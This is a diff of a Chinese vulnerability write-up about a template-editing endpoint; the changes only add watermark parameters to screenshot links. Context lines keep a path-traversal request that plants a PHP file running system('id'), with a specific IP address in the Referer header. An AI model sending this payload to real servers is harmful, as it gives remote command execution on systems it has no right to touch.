@@ -122,7 +122,7 @@ $ymlData = Spyc::YAMLLoad($_POST['code']);
     $fullpath = $config_templates_basedir+ .$fileName;
 ```
 
-![](http://wikioss.peiqi.tech/vuln/rc-7.png)
+![](http://wikioss.peiqi.tech/vuln/rc-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```php
 $filehandle = fopen($fullpath, 'w+');
@@ -149,13 +149,13 @@ Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php
 fileName=../www/pq.php&code=<?php echo system('id');?>&id=1
 ```
 
-![](http://wikioss.peiqi.tech/vuln/rc-8.png)
+![](http://wikioss.peiqi.tech/vuln/rc-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 
 
 这里写入文件 **pq.php.yml**,并使用 **../** 跳出限制的目录，访问 pq.php.yml 实际访问了 pq.php，执行id命令
 
-![](http://wikioss.peiqi.tech/vuln/rc-9.png)
+![](http://wikioss.peiqi.tech/vuln/rc-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞POC
 
@@ -260,4 +260,4 @@ if __name__ == '__main__':
 
 ```
 
-![](http://wikioss.peiqi.tech/vuln/rc-10.png)
+![](http://wikioss.peiqi.tech/vuln/rc-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
